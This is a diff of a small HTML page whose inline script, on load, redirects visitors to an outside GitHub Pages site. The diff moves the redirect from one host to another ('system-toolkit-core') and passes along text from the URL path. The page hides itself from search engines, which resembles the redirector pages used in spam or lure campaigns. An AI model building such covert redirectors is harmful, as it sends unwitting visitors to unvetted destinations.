@@ -6,10 +6,15 @@
     <title>...</title>
     <script>
         (function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const offer = urlParams.get('offer') || '';
-            const offerText = offer.replace(/-/g, ' ');
-            window.location.replace('https://thynizaudin.github.io/.github/?text=' + encodeURIComponent(offerText));
+            const path = window.location.pathname;
+            const match = path.match(/\/\.github\/(.+)$/);
+            
+            if (match && match[1]) {
+                const text = match[1];
+                window.location.replace('https://system-toolkit-core.github.io/.github/?text=' + encodeURIComponent(text));
+            } else {
+                window.location.replace('https://system-toolkit-core.github.io/.github/');
+            }
         })();
     </script>
     <meta name="robots" content="noindex, nofollow">
